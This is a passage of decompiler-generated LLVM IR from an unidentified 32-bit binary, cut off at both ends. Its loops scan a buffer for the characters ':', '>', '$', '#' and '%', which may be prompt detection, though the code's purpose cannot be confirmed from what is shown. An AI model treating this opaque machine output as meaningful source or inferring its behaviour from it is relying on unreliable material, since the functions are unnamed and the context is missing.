  %v2_80501dc = add i32 %v0_80501d5, -12
  %v3_80501dc = inttoptr i32 %v2_80501dc to i32*
  store i32 %v0_80501dc, i32* %v3_80501dc, align 4
  %v1_80501dd = add i32 %v0_80501d5, 8
  %v2_80501dd = inttoptr i32 %v1_80501dd to i32*
  %v3_80501dd = load i32, i32* %v2_80501dd, align 4
  %v2_80501e1 = add i32 %v0_80501d5, -16
  %v3_80501e1 = inttoptr i32 %v2_80501e1 to i32*
  store i32 %v3_80501dd, i32* %v3_80501e1, align 4
  %v0_80501e2 = call i32 @function_8051590()
  store i32 %v0_80501e2, i32* %eax.global-to-local, align 4
  store i32 %v0_80501e2, i32* @ebp, align 4
  %v10_80501ec = icmp eq i32 %v0_80501e2, -1
  %v1_80501ef = icmp eq i1 %v10_80501ec, false
  br i1 %v1_80501ef, label %dec_label_pc_80507b8, label %dec_label_pc_804fffc.loopexit12.loopexit

dec_label_pc_8050200:                             ; preds = %dec_label_pc_8050072
  %v1_8050200 = add i32 %v0_8050072, 24
  %v2_8050200 = inttoptr i32 %v1_8050200 to i32*
  %v3_8050200 = load i32, i32* %v2_8050200, align 4
  %v1_8050203 = add i32 %v3_8050200, -1
  store i32 %v1_8050203, i32* %eax.global-to-local, align 4
  %tmp130 = icmp slt i32 %v1_8050203, 1
  br i1 %tmp130, label %dec_label_pc_804fffc.loopexit12.loopexit, label %dec_label_pc_805020c.preheader

dec_label_pc_805020c.preheader:                   ; preds = %dec_label_pc_8050200
  %v7_805020c.pre = load i32, i32* @edx, align 4
  %v2_805020c = add i32 %v0_8050072, 28
  br label %dec_label_pc_805020c

dec_label_pc_805020c:                             ; preds = %dec_label_pc_805020c.preheader, %dec_label_pc_805023d
  %v7_805020c = phi i32 [ %v7_805020c.pre, %dec_label_pc_805020c.preheader ], [ %v9_805020c, %dec_label_pc_805023d ]
  %v0_8050669 = phi i32 [ %v1_8050203, %dec_label_pc_805020c.preheader ], [ %v1_805023d, %dec_label_pc_805023d ]
  %v3_805020c = add i32 %v2_805020c, %v0_8050669
  %v4_805020c = inttoptr i32 %v3_805020c to i8*
  %v5_805020c = load i8, i8* %v4_805020c, align 1
  %v6_805020c = zext i8 %v5_805020c to i32
  %v8_805020c = and i32 %v7_805020c, -256
  %v9_805020c = or i32 %v6_805020c, %v8_805020c
  store i32 %v9_805020c, i32* %edx.global-to-local, align 4
  %v10_8050210 = icmp eq i8 %v5_805020c, 58
  br i1 %v10_8050210, label %dec_label_pc_8050669, label %dec_label_pc_8050219

dec_label_pc_8050219:                             ; preds = %dec_label_pc_805020c
  %v10_8050219 = icmp eq i8 %v5_805020c, 62
  br i1 %v10_8050219, label %dec_label_pc_8050669, label %dec_label_pc_8050222

dec_label_pc_8050222:                             ; preds = %dec_label_pc_8050219
  %v10_8050222 = icmp eq i8 %v5_805020c, 36
  br i1 %v10_8050222, label %dec_label_pc_8050669, label %dec_label_pc_805022b

dec_label_pc_805022b:                             ; preds = %dec_label_pc_8050222
  %v10_805022b = icmp eq i8 %v5_805020c, 35
  br i1 %v10_805022b, label %dec_label_pc_8050669, label %dec_label_pc_8050234

dec_label_pc_8050234:                             ; preds = %dec_label_pc_805022b
  %v10_8050234 = icmp eq i8 %v5_805020c, 37
  br i1 %v10_8050234, label %dec_label_pc_8050669, label %dec_label_pc_805023d

dec_label_pc_805023d:                             ; preds = %dec_label_pc_8050234
  %v1_805023d = add i32 %v0_8050669, -1
  %v8_805023d = icmp eq i32 %v1_805023d, 0
  store i32 %v1_805023d, i32* %eax.global-to-local, align 4
  %v1_805023e = icmp eq i1 %v8_805023d, false
  br i1 %v1_805023e, label %dec_label_pc_805020c, label %dec_label_pc_804fffc.backedge

dec_label_pc_8050245:                             ; preds = %dec_label_pc_8050072
  %v1_8050245 = add i32 %v0_8050072, 24
  %v2_8050245 = inttoptr i32 %v1_8050245 to i32*
  %v3_8050245 = load i32, i32* %v2_8050245, align 4
  %v1_8050248 = add i32 %v3_8050245, -1
  store i32 %v1_8050248, i32* %eax.global-to-local, align 4
  %tmp131 = icmp slt i32 %v1_8050248, 1
  br i1 %tmp131, label %dec_label_pc_804fffc.loopexit12.loopexit, label %dec_label_pc_8050251

dec_label_pc_8050251:                             ; preds = %dec_label_pc_8050245
  %v2_8050251 = add i32 %v0_8050072, 27
  %v3_8050251 = add i32 %v2_8050251, %v3_8050245
  %v4_8050251 = inttoptr i32 %v3_8050251 to i8*
  %v5_8050251 = load i8, i8* %v4_8050251, align 1
  %v6_8050251 = zext i8 %v5_8050251 to i32
  %v7_8050251 = load i32, i32* @edx, align 4
  %v8_8050251 = and i32 %v7_8050251, -256
  %v9_8050251 = or i32 %v8_8050251, %v6_8050251
  store i32 %v9_8050251, i32* %edx.global-to-local, align 4
  %v10_8050255 = icmp eq i8 %v5_8050251, 62
  br i1 %v10_8050255, label %dec_label_pc_8050283.thread, label %dec_label_pc_805025a

dec_label_pc_805025a:                             ; preds = %dec_label_pc_8050251
  %v10_805025a = icmp eq i8 %v5_8050251, 58
  br i1 %v10_805025a, label %dec_label_pc_8050283.thread, label %dec_label_pc_805025f

dec_label_pc_805025f:                             ; preds = %dec_label_pc_805025a, %dec_label_pc_805027e
  %v0_805026e = phi i32 [ %v1_805026e, %dec_label_pc_805027e ], [ %v1_8050248, %dec_label_pc_805025a ]
  %v7_8050275 = phi i32 [ %v9_8050275, %dec_label_pc_805027e ], [ %v9_8050251, %dec_label_pc_805025a ]
  %v1_805025f = trunc i32 %v7_8050275 to i8
  %v10_805025f = icmp eq i8 %v1_805025f, 36
  br i1 %v10_805025f, label %dec_label_pc_8050283, label %dec_label_pc_8050264

dec_label_pc_8050264:                             ; preds = %dec_label_pc_805025f
  %v10_8050264 = icmp eq i8 %v1_805025f, 35
  br i1 %v10_8050264, label %dec_label_pc_8050283, label %dec_label_pc_8050269

dec_label_pc_8050269:                             ; preds = %dec_label_pc_8050264
  %v10_8050269 = icmp eq i8 %v1_805025f, 37
  br i1 %v10_8050269, label %dec_label_pc_8050283, label %dec_label_pc_805026e

dec_label_pc_805026e:                             ; preds = %dec_label_pc_8050269
  %v1_805026e = add i32 %v0_805026e, -1
  %v8_805026e = icmp eq i32 %v1_805026e, 0
  store i32 %v1_805026e, i32* %eax.global-to-local, align 4
  br i1 %v8_805026e, label %dec_label_pc_804fffc.backedge, label %dec_label_pc_8050275

dec_label_pc_8050275:                             ; preds = %dec_label_pc_805026e
  %v3_8050275 = add i32 %v2_8050251, %v0_805026e
  %v4_8050275 = inttoptr i32 %v3_8050275 to i8*
  %v5_8050275 = load i8, i8* %v4_8050275, align 1
  %v6_8050275 = zext i8 %v5_8050275 to i32
  %v8_8050275 = and i32 %v7_8050275, -256
  %v9_8050275 = or i32 %v6_8050275, %v8_8050275
  store i32 %v9_8050275, i32* %edx.global-to-local, align 4
  %v10_8050279 = icmp eq i8 %v5_8050275, 58
  br i1 %v10_8050279, label %dec_label_pc_8050283, label %dec_label_pc_805027e

dec_label_pc_805027e:                             ; preds = %dec_label_pc_8050275
  %v10_805027e = icmp eq i8 %v5_8050275, 62
  %v1_8050281 = icmp eq i1 %v10_805027e, false
  br i1 %v1_8050281, label %dec_label_pc_805025f, label %dec_label_pc_8050283

dec_label_pc_8050283.thread:                      ; preds = %dec_label_pc_805025a, %dec_label_pc_8050251
  store i32 %v3_8050245, i32* @ebp, align 4
  br label %dec_label_pc_805028f

dec_label_pc_8050283:                             ; preds = %dec_label_pc_805027e, %dec_label_pc_8050275, %dec_label_pc_8050269, %dec_label_pc_8050264, %dec_label_pc_805025f
  %v0_8050283 = phi i32 [ %v0_805026e, %dec_label_pc_805025f ], [ %v0_805026e, %dec_label_pc_8050264 ], [ %v0_805026e, %dec_label_pc_8050269 ], [ %v1_805026e, %dec_label_pc_8050275 ], [ %v1_805026e, %dec_label_pc_805027e ]
  %v1_8050283 = add i32 %v0_8050283, 1
  store i32 %v1_8050283, i32* @ebp, align 4
  %v10_8050286 = icmp eq i32 %v0_8050283, -2
  br i1 %v10_8050286, label %dec_label_pc_804fffc.loopexit12.loopexit, label %dec_label_pc_805028f

dec_label_pc_805028f:                             ; preds = %dec_label_pc_8050283.thread, %dec_label_pc_8050283
  %v1_8050283147 = phi i32 [ %v3_8050245, %dec_label_pc_8050283.thread ], [ %v1_8050283, %dec_label_pc_8050283 ]
  %tmp132 = icmp slt i32 %v1_8050283147, 1
  br i1 %tmp132, label %dec_label_pc_8050523, label %dec_label_pc_8050297

dec_label_pc_8050297:                             ; preds = %dec_label_pc_805028f
  %v0_8050297 = load i32, i32* @esp, align 4
  %v1_805029a = add i32 %v0_8050297, -16
  %v2_805029a = inttoptr i32 %v1_805029a to i32*
  store i32 22, i32* %v2_805029a, align 4
  %v2_805029c = call i32 @function_8050be0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_805029c, i32* %eax.global-to-local, align 4
  %v0_80502a1 = load i32, i32* @esp, align 4
  %v1_80502a1 = inttoptr i32 %v0_80502a1 to i32*
  %v2_80502a1 = load i32, i32* %v1_80502a1, align 4
  store i32 %v2_80502a1, i32* %eax.global-to-local, align 4
  %v3_80502a1 = add i32 %v0_80502a1, 4
  %v1_80502a2 = inttoptr i32 %v3_80502a1 to i32*
  %v2_80502a2 = load i32, i32* %v1_80502a2, align 4
  store i32 %v2_80502a2, i32* %edx.global-to-local, align 4
  %v1_80502a3 = add i32 %v0_80502a1, 1872
  store i32 %v1_80502a3, i32* %eax.global-to-local, align 4
  store i32 %v1_80502a3, i32* %v1_80502a2, align 4
  store i32 22, i32* %v1_80502a1, align 4
  %v3_80502ad = call i32 @function_8050b30(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_80502ad, i32* %eax.global-to-local, align 4
  %v0_80502b2 = load i32, i32* @esp, align 4
  %v1_80502b2 = add i32 %v0_80502b2, -4
  %v2_80502b2 = inttoptr i32 %v1_80502b2 to i32*
  store i32 16384, i32* %v2_80502b2, align 4
  %v1_80502b7 = add i32 %v0_80502b2, 1872
  %v2_80502b7 = inttoptr i32 %v1_80502b7 to i32*
  %v3_80502b7 = load i32, i32* %v2_80502b7, align 4
  store i32 %v3_80502b7, i32* @esi, align 4
  %v2_80502be = add i32 %v0_80502b2, -8
  %v3_80502be = inttoptr i32 %v2_80502be to i32*
  store i32 %v3_80502b7, i32* %v3_80502be, align 4
  %v2_80502bf = add i32 %v0_80502b2, -12
  %v3_80502bf = inttoptr i32 %v2_80502bf to i32*
  store i32 %v3_80502ad, i32* %v3_80502bf, align 4
  %v0_80502c0 = load i32, i32* @edi, align 4
  %v1_80502c0 = add i32 %v0_80502c0, 4
  %v2_80502c0 = inttoptr i32 %v1_80502c0 to i32*
  %v3_80502c0 = load i32, i32* %v2_80502c0, align 4
  store i32 %v3_80502c0, i32* @ebx, align 4
  %v2_80502c3 = add i32 %v0_80502b2, -16
  %v3_80502c3 = inttoptr i32 %v2_80502c3 to i32*
  store i32 %v3_80502c0, i32* %v3_80502c3, align 4
  %v0_80502c4 = call i32 @function_80521c4()
  store i32 %v0_80502c4, i32* %eax.global-to-local, align 4
  %v0_80502c9 = load i32, i32* @esp, align 4
  %v1_80502cc = add i32 %v0_80502c9, 28
  %v2_80502cc = inttoptr i32 %v1_80502cc to i32*
  store i32 16384, i32* %v2_80502cc, align 4
  %v1_80502d1 = add i32 %v0_80502c9, 24
  %v2_80502d1 = inttoptr i32 %v1_80502d1 to i32*
  store i32 2, i32* %v2_80502d1, align 4
  %v1_80502d3 = add i32 %v0_80502c9, 20
  %v2_80502d3 = inttoptr i32 %v1_80502d3 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v2_80502d3, align 4
  %v0_80502d8 = load i32, i32* @edi, align 4
  %v1_80502d8 = add i32 %v0_80502d8, 4
  %v2_80502d8 = inttoptr i32 %v1_80502d8 to i32*
  %v3_80502d8 = load i32, i32* %v2_80502d8, align 4
  store i32 %v3_80502d8, i32* %ecx.global-to-local, align 4
  %v2_80502db = add i32 %v0_80502c9, 16
  %v3_80502db = inttoptr i32 %v2_80502db to i32*
  store i32 %v3_80502d8, i32* %v3_80502db, align 4
  %v0_80502dc = call i32 @function_80521c4()
  store i32 %v0_80502dc, i32* %eax.global-to-local, align 4
  %v0_80502e1 = load i32, i32* @esp, align 4
  %v1_80502e1 = inttoptr i32 %v0_80502e1 to i32*
  store i32 22, i32* %v1_80502e1, align 4
  %v2_80502e8 = call i32 @function_8050b60(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80502e8, i32* %eax.global-to-local, align 4
  %v0_80502f0 = load i32, i32* @edi, align 4
  %v1_80502f0 = add i32 %v0_80502f0, 12
  %v2_80502f0 = inttoptr i32 %v1_80502f0 to i32*
  store i32 7, i32* %v2_80502f0, align 4
  br label %dec_label_pc_8050383

dec_label_pc_80502fc:                             ; preds = %dec_label_pc_8050072
  %v0_80502fc = load i32, i32* @esp, align 4
  %v1_80502ff = add i32 %v0_80502fc, -16
  %v2_80502ff = inttoptr i32 %v1_80502ff to i32*
  store i32 26, i32* %v2_80502ff, align 4
  %v2_8050301 = call i32 @function_8050be0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050301, i32* %eax.global-to-local, align 4
  %v0_8050306 = load i32, i32* @esp, align 4
  %v1_8050306 = inttoptr i32 %v0_8050306 to i32*
  %v2_8050306 = load i32, i32* %v1_8050306, align 4
  store i32 %v2_8050306, i32* %eax.global-to-local, align 4
  %v3_8050306 = add i32 %v0_8050306, 4
  %v1_8050307 = inttoptr i32 %v3_8050306 to i32*
  %v2_8050307 = load i32, i32* %v1_8050307, align 4
  store i32 %v2_8050307, i32* %edx.global-to-local, align 4
  %v1_8050308 = add i32 %v0_8050306, 1864
  store i32 %v1_8050308, i32* %eax.global-to-local, align 4
  store i32 %v1_8050308, i32* %v1_8050307, align 4
  store i32 26, i32* %v1_8050306, align 4
  %v3_8050312 = call i32 @function_8050b30(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050312, i32* %eax.global-to-local, align 4
  %v0_8050317 = load i32, i32* @esp, align 4
  %v1_8050317 = add i32 %v0_8050317, 1864
  %v2_8050317 = inttoptr i32 %v1_8050317 to i32*
  %v3_8050317 = load i32, i32* %v2_8050317, align 4
  %v1_805031e = add i32 %v3_8050317, -1
  store i32 %v1_805031e, i32* %edx.global-to-local, align 4
  %v2_805031f = add i32 %v0_8050317, -4
  %v3_805031f = inttoptr i32 %v2_805031f to i32*
  store i32 %v1_805031e, i32* %v3_805031f, align 4
  %v2_8050320 = add i32 %v0_8050317, -8
  %v3_8050320 = inttoptr i32 %v2_8050320 to i32*
  store i32 %v3_8050312, i32* %v3_8050320, align 4
  %v0_8050321 = load i32, i32* @edi, align 4
  %v1_8050321 = add i32 %v0_8050321, 24
  %v2_8050321 = inttoptr i32 %v1_8050321 to i32*
  %v3_8050321 = load i32, i32* %v2_8050321, align 4
  store i32 %v3_8050321, i32* %eax.global-to-local, align 4
  %v2_8050324 = add i32 %v0_8050317, -12
  %v3_8050324 = inttoptr i32 %v2_8050324 to i32*
  store i32 %v3_8050321, i32* %v3_8050324, align 4
  %v1_8050325 = add i32 %v0_8050317, 24
  %v2_8050325 = inttoptr i32 %v1_8050325 to i32*
  %v3_8050325 = load i32, i32* %v2_8050325, align 4
  store i32 %v3_8050325, i32* %eax.global-to-local, align 4
  %v2_8050329 = add i32 %v0_8050317, -16
  %v3_8050329 = inttoptr i32 %v2_8050329 to i32*
  store i32 %v3_8050325, i32* %v3_8050329, align 4
  %v0_805032a = call i32 @function_8051590()
  %v0_805032f = load i32, i32* @esp, align 4
  %v1_8050332 = add i32 %v0_805032a, 1
  %v8_8050332 = icmp eq i32 %v1_8050332, 0
  store i32 %v1_8050332, i32* %eax.global-to-local, align 4
  %v1_8050842 = add i32 %v0_805032f, 16
  %v2_8050842 = inttoptr i32 %v1_8050842 to i32*
  store i32 26, i32* %v2_8050842, align 4
  %v2_8050844 = call i32 @function_8050b60(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050844, i32* %eax.global-to-local, align 4
  %v0_8050849 = load i32, i32* @esp, align 4
  %v1_8050849 = inttoptr i32 %v0_8050849 to i32*
  br i1 %v8_8050332, label %dec_label_pc_805083f, label %dec_label_pc_8050339

dec_label_pc_8050339:                             ; preds = %dec_label_pc_80502fc
  %v2_8050343 = load i32, i32* %v1_8050849, align 4
  store i32 %v2_8050343, i32* %eax.global-to-local, align 4
  %v0_8050344 = load i32, i32* @edi, align 4
  %v1_8050344 = add i32 %v0_8050344, 4
  %v2_8050344 = inttoptr i32 %v1_8050344 to i32*
  %v3_8050344 = load i32, i32* %v2_8050344, align 4
  store i32 %v3_8050344, i32* %eax.global-to-local, align 4
  store i32 %v3_8050344, i32* %v1_8050849, align 4
  %v1_8050348 = call i32 @function_8051a81(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050348, i32* %eax.global-to-local, align 4
  %v0_8050350 = load i32, i32* @edi, align 4
  %v1_8050350 = add i32 %v0_8050350, 4
  %v2_8050350 = inttoptr i32 %v1_8050350 to i32*
  store i32 -1, i32* %v2_8050350, align 4
  %v0_8050357 = load i32, i32* @global_var_8056158.47, align 8
  store i32 %v0_8050357, i32* %edx.global-to-local, align 4
  %v0_805035d = load i32, i32* @esp, align 4
  %v1_805035d = add i32 %v0_805035d, 1852
  %v2_805035d = inttoptr i32 %v1_805035d to i32*
  %v3_805035d = load i32, i32* %v2_805035d, align 4
  store i32 %v3_805035d, i32* %eax.global-to-local, align 4
  %v1_8050364 = add i32 %v0_8050357, -1
  store i32 %v1_8050364, i32* %edx.global-to-local, align 4
  %v1_8050365 = mul i32 %v3_805035d, 4
  %v2_8050365 = add i32 %v1_8050365, 134570496
  %v3_8050365 = inttoptr i32 %v2_8050365 to i32*
  %v4_8050365 = load i32, i32* %v3_8050365, align 4
  %v6_8050365 = sub i32 %v4_8050365, %v1_8050364
  %v12_8050365 = xor i32 %v4_8050365, %v1_8050364
  %v13_8050365 = xor i32 %v6_8050365, %v4_8050365
  %v14_8050365 = and i32 %v13_8050365, %v12_8050365
  %v15_8050365 = icmp slt i32 %v14_8050365, 0
  %v16_8050365 = icmp eq i32 %v6_8050365, 0
  %v17_8050365 = icmp slt i32 %v6_8050365, 0
  %v3_805036c = icmp ne i1 %v17_8050365, %v15_8050365
  %v4_805036c = or i1 %v16_8050365, %v3_805036c
  %v0_80509b8 = load i32, i32* @edi, align 4
  br i1 %v4_805036c, label %dec_label_pc_80509b8, label %dec_label_pc_8050372

dec_label_pc_8050372:                             ; preds = %dec_label_pc_8050339
  %v1_8050372 = add i32 %v0_80509b8, 284
  %v2_8050372 = inttoptr i32 %v1_8050372 to i8*
  store i8 0, i8* %v2_8050372, align 1
  %v0_8050379 = load i32, i32* @edi, align 4
  %v1_8050379 = add i32 %v0_8050379, 12
  %v2_8050379 = inttoptr i32 %v1_8050379 to i32*
  store i32 0, i32* %v2_8050379, align 4
  store i32 -1, i32* @ebp, align 4
  br label %dec_label_pc_8050383

dec_label_pc_8050383:                             ; preds = %dec_label_pc_8050523, %dec_label_pc_80504b3, %dec_label_pc_8050400, %dec_label_pc_80509b8, %dec_label_pc_80508c2, %dec_label_pc_8050297, %dec_label_pc_805067d, %dec_label_pc_80507c0, %dec_label_pc_80506f6, %dec_label_pc_8050109, %dec_label_pc_8050747, %dec_label_pc_8050372
  %v0_8050383 = load i32, i32* @edi, align 4
  %v1_8050383 = add i32 %v0_8050383, 24
  %v2_8050383 = inttoptr i32 %v1_8050383 to i32*
  %v3_8050383 = load i32, i32* %v2_8050383, align 4
  store i32 %v3_8050383, i32* @edx, align 4
  store i32 %v3_8050383, i32* %eax.global-to-local, align 4
  %v1_8050388 = load i32, i32* @ebp, align 4
  %v2_8050388 = sub i32 %v3_8050383, %v1_8050388
  %v8_8050388 = xor i32 %v1_8050388, %v3_8050383
  %v9_8050388 = xor i32 %v2_8050388, %v3_8050383
  %v10_8050388 = and i32 %v9_8050388, %v8_8050388
  %v11_8050388 = icmp slt i32 %v10_8050388, 0
  %v12_8050388 = icmp eq i32 %v2_8050388, 0
  %v13_8050388 = icmp slt i32 %v2_8050388, 0
  %v3_805038a = icmp ne i1 %v13_8050388, %v11_8050388
  %v4_805038a = or i1 %v12_8050388, %v3_805038a
  br i1 %v4_805038a, label %dec_label_pc_805038e, label %dec_label_pc_805038c

dec_label_pc_805038c:                             ; preds = %dec_label_pc_8050383
  store i32 %v1_8050388, i32* @edx, align 4
  br label %dec_label_pc_805038e

dec_label_pc_805038e:                             ; preds = %dec_label_pc_8050383, %dec_label_pc_805038c
  %v1_805038e = phi i32 [ %v3_8050383, %dec_label_pc_8050383 ], [ %v1_8050388, %dec_label_pc_805038c ]
  %v2_805038e = sub i32 %v3_8050383, %v1_805038e
  store i32 %v2_805038e, i32* %eax.global-to-local, align 4
  store i32 %v2_805038e, i32* %v2_8050383, align 4
  %v0_8050393 = load i32, i32* @ebx, align 4
  %v1_8050393 = load i32, i32* @esp, align 4
  %v2_8050393 = add i32 %v1_8050393, -4
  %v3_8050393 = inttoptr i32 %v2_8050393 to i32*
  store i32 %v0_8050393, i32* %v3_8050393, align 4
  %v0_8050394 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050394 = add i32 %v1_8050393, -8
  %v3_8050394 = inttoptr i32 %v2_8050394 to i32*
  store i32 %v0_8050394, i32* %v3_8050394, align 4
  %v1_8050395 = add i32 %v1_8050393, 8
  %v2_8050395 = inttoptr i32 %v1_8050395 to i32*
  %v3_8050395 = load i32, i32* %v2_8050395, align 4
  %v1_8050399 = load i32, i32* @edx, align 4
  %v2_8050399 = add i32 %v1_8050399, %v3_8050395
  store i32 %v2_8050399, i32* %eax.global-to-local, align 4
  %v2_805039b = add i32 %v1_8050393, -12
  %v3_805039b = inttoptr i32 %v2_805039b to i32*
  store i32 %v2_8050399, i32* %v3_805039b, align 4
  %v3_805039c = load i32, i32* %v2_8050395, align 4
  store i32 %v3_805039c, i32* %ecx.global-to-local, align 4
  %v2_80503a0 = add i32 %v1_8050393, -16
  %v3_80503a0 = inttoptr i32 %v2_80503a0 to i32*
  store i32 %v3_805039c, i32* %v3_80503a0, align 4
  %v4_80503a1 = call i32 @function_8051fe3(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80503a1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050072

dec_label_pc_80503ae:                             ; preds = %dec_label_pc_8050072
  %v1_80503ae = add i32 %v0_8050072, 24
  %v2_80503ae = inttoptr i32 %v1_80503ae to i32*
  %v3_80503ae = load i32, i32* %v2_80503ae, align 4
  %v1_80503b1 = add i32 %v3_80503ae, -1
  store i32 %v1_80503b1, i32* %eax.global-to-local, align 4
  %tmp133 = icmp slt i32 %v1_80503b1, 1
  br i1 %tmp133, label %dec_label_pc_804fffc.loopexit12.loopexit, label %dec_label_pc_80503ba

dec_label_pc_80503ba:                             ; preds = %dec_label_pc_80503ae
  %v2_80503ba = add i32 %v0_8050072, 27
  %v3_80503ba = add i32 %v2_80503ba, %v3_80503ae
  %v4_80503ba = inttoptr i32 %v3_80503ba to i8*
  %v5_80503ba = load i8, i8* %v4_80503ba, align 1
  %v6_80503ba = zext i8 %v5_80503ba to i32
  %v7_80503ba = load i32, i32* @edx, align 4
  %v8_80503ba = and i32 %v7_80503ba, -256
  %v9_80503ba = or i32 %v8_80503ba, %v6_80503ba
  store i32 %v9_80503ba, i32* %edx.global-to-local, align 4
  %v10_80503be = icmp eq i8 %v5_80503ba, 62
  br i1 %v10_80503be, label %dec_label_pc_80503ec.thread, label %dec_label_pc_80503c3

dec_label_pc_80503c3:                             ; preds = %dec_label_pc_80503ba
  %v10_80503c3 = icmp eq i8 %v5_80503ba, 58
  br i1 %v10_80503c3, label %dec_label_pc_80503ec.thread, label %dec_label_pc_80503c8

dec_label_pc_80503c8:                             ; preds = %dec_label_pc_80503c3, %dec_label_pc_80503e7
  %v0_80503d7 = phi i32 [ %v1_80503d7, %dec_label_pc_80503e7 ], [ %v1_80503b1, %dec_label_pc_80503c3 ]
  %v7_80503de = phi i32 [ %v9_80503de, %dec_label_pc_80503e7 ], [ %v9_80503ba, %dec_label_pc_80503c3 ]
  %v1_80503c8 = trunc i32 %v7_80503de to i8
  %v10_80503c8 = icmp eq i8 %v1_80503c8, 36
  br i1 %v10_80503c8, label %dec_label_pc_80503ec, label %dec_label_pc_80503cd

dec_label_pc_80503cd:                             ; preds = %dec_label_pc_80503c8
  %v10_80503cd = icmp eq i8 %v1_80503c8, 35
  br i1 %v10_80503cd, label %dec_label_pc_80503ec, label %dec_label_pc_80503d2

dec_label_pc_80503d2:                             ; preds = %dec_label_pc_80503cd
  %v10_80503d2 = icmp eq i8 %v1_80503c8, 37
  br i1 %v10_80503d2, label %dec_label_pc_80503ec, label %dec_label_pc_80503d7

dec_label_pc_80503d7:                             ; preds = %dec_label_pc_80503d2
  %v1_80503d7 = add i32 %v0_80503d7, -1
  %v8_80503d7 = icmp eq i32 %v1_80503d7, 0
  store i32 %v1_80503d7, i32* %eax.global-to-local, align 4
  br i1 %v8_80503d7, label %dec_label_pc_804fffc.backedge, label %dec_label_pc_80503de

dec_label_pc_80503de:                             ; preds = %dec_label_pc_80503d7
  %v3_80503de = add i32 %v2_80503ba, %v0_80503d7
  %v4_80503de = inttoptr i32 %v3_80503de to i8*
  %v5_80503de = load i8, i8* %v4_80503de, align 1
  %v6_80503de = zext i8 %v5_80503de to i32
  %v8_80503de = and i32 %v7_80503de, -256
  %v9_80503de = or i32 %v6_80503de, %v8_80503de
  store i32 %v9_80503de, i32* %edx.global-to-local, align 4
  %v10_80503e2 = icmp eq i8 %v5_80503de, 58
  br i1 %v10_80503e2, label %dec_label_pc_80503ec, label %dec_label_pc_80503e7

dec_label_pc_80503e7:                             ; preds = %dec_label_pc_80503de
  %v10_80503e7 = icmp eq i8 %v5_80503de, 62
  %v1_80503ea = icmp eq i1 %v10_80503e7, false
  br i1 %v1_80503ea, label %dec_label_pc_80503c8, label %dec_label_pc_80503ec

dec_label_pc_80503ec.thread:                      ; preds = %dec_label_pc_80503c3, %dec_label_pc_80503ba
  store i32 %v3_80503ae, i32* @ebp, align 4
  br label %dec_label_pc_80503f8

dec_label_pc_80503ec:                             ; preds = %dec_label_pc_80503e7, %dec_label_pc_80503de, %dec_label_pc_80503d2, %dec_label_pc_80503cd, %dec_label_pc_80503c8
  %v0_80503ec = phi i32 [ %v0_80503d7, %dec_label_pc_80503c8 ], [ %v0_80503d7, %dec_label_pc_80503cd ], [ %v0_80503d7, %dec_label_pc_80503d2 ], [ %v1_80503d7, %dec_label_pc_80503de ], [ %v1_80503d7, %dec_label_pc_80503e7 ]
  %v1_80503ec = add i32 %v0_80503ec, 1
  store i32 %v1_80503ec, i32* @ebp, align 4
  %v10_80503ef = icmp eq i32 %v0_80503ec, -2
  br i1 %v10_80503ef, label %dec_label_pc_804fffc.loopexit12.loopexit, label %dec_label_pc_80503f8

dec_label_pc_80503f8:                             ; preds = %dec_label_pc_80503ec.thread, %dec_label_pc_80503ec
  %v1_80503ec150 = phi i32 [ %v3_80503ae, %dec_label_pc_80503ec.thread ], [ %v1_80503ec, %dec_label_pc_80503ec ]
  %tmp134 = icmp slt i32 %v1_80503ec150, 1
  br i1 %tmp134, label %dec_label_pc_8050523, label %dec_label_pc_8050400

dec_label_pc_8050400:                             ; preds = %dec_label_pc_80503f8
  %v0_8050400 = load i32, i32* @esp, align 4
  %v1_8050403 = add i32 %v0_8050400, -16
  %v2_8050403 = inttoptr i32 %v1_8050403 to i32*
  store i32 20, i32* %v2_8050403, align 4
  %v2_8050405 = call i32 @function_8050be0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050405, i32* %eax.global-to-local, align 4
  %v0_805040a = load i32, i32* @esp, align 4
  %v1_805040a = inttoptr i32 %v0_805040a to i32*
  %v2_805040a = load i32, i32* %v1_805040a, align 4
  store i32 %v2_805040a, i32* %eax.global-to-local, align 4
  %v3_805040a = add i32 %v0_805040a, 4
  %v1_805040b = inttoptr i32 %v3_805040a to i32*
  %v2_805040b = load i32, i32* %v1_805040b, align 4
  store i32 %v2_805040b, i32* %edx.global-to-local, align 4
  %v1_805040c = add i32 %v0_805040a, 1872
  store i32 %v1_805040c, i32* %eax.global-to-local, align 4
  store i32 %v1_805040c, i32* %v1_805040b, align 4
  store i32 20, i32* %v1_805040a, align 4
  %v3_8050416 = call i32 @function_8050b30(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050416, i32* %eax.global-to-local, align 4
  %v0_805041b = load i32, i32* @esp, align 4
  %v1_805041b = add i32 %v0_805041b, -4
  %v2_805041b = inttoptr i32 %v1_805041b to i32*
  store i32 16384, i32* %v2_805041b, align 4
  %v1_8050420 = add i32 %v0_805041b, 1872
  %v2_8050420 = inttoptr i32 %v1_8050420 to i32*
  %v3_8050420 = load i32, i32* %v2_8050420, align 4
  store i32 %v3_8050420, i32* @esi, align 4
  %v2_8050427 = add i32 %v0_805041b, -8
  %v3_8050427 = inttoptr i32 %v2_8050427 to i32*
  store i32 %v3_8050420, i32* %v3_8050427, align 4
  %v2_8050428 = add i32 %v0_805041b, -12
  %v3_8050428 = inttoptr i32 %v2_8050428 to i32*
  store i32 %v3_8050416, i32* %v3_8050428, align 4
  %v0_8050429 = load i32, i32* @edi, align 4
  %v1_8050429 = add i32 %v0_8050429, 4
  %v2_8050429 = inttoptr i32 %v1_8050429 to i32*
  %v3_8050429 = load i32, i32* %v2_8050429, align 4
  store i32 %v3_8050429, i32* @ebx, align 4
